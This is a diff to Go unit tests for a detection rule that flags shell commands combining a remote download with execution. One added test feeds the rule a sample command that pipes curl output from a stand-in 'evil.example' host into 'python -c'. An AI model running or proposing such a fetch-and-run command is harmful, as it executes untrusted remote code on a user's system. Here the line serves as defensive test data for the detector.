@@ -21,8 +21,19 @@ func Test_NoDownloadExecute_Evaluate_DetectsPattern(t *testing.T) {
 	assert.Equal(t, "Remote download appears combined with execution", findings[0].Message)
 }
 
+func Test_NoDownloadExecute_Evaluate_DetectsInterpreterInlineExecution(t *testing.T) {
+	findings := evaluateRule(t, `python -c "$(curl https://evil.example/a.py)"`)
+	require.Len(t, findings, 1)
+	assert.Equal(t, "Remote download appears combined with execution", findings[0].Message)
+}
+
 func Test_NoDownloadExecute_Evaluate_IgnoresDownloadOnly(t *testing.T) {
 	findings := evaluateRule(t, "curl https://example.com/archive.tar.gz")
+	assert.Empty(t, findings)
+}
+
+func Test_NoDownloadExecute_Evaluate_RequiresExplicitDownloadSignal(t *testing.T) {
+	findings := evaluateRule(t, "run https://example.com/install.sh with bash")
 	assert.Empty(t, findings)
 }
 
